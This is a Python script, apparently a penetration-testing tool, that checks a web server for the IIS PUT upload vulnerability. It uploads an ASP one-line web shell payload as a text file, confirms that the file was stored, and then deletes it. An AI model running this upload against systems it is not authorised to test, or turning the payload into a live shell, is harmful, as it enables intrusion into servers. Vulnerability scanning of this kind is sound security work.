#!/usr/bin/env python3
# coding:utf-8
# IIS PUT 上传漏洞检测脚本
# author：ske
# usage: python3 iis_put.py http://xxx.xxx.xxx.xxx

import requests
import sys

ip = sys.argv[1]
url = '{}/2222.txt'.format(ip)
data = '<%eval request("1111111111")%>'
res = requests.put(url=url, data=data, timeout=5)
html_text = requests.get(url).text
if '<%eval request("1111111111")%>' in html_text:
    print('[+] {} 存在IIS PUT上传'.format(ip))
    requests.delete(url)
    print('[+] {} 成功删除测试文件'.format(ip))
else:
    print('[-] {} 不存在IIS PUT上传'.format(ip))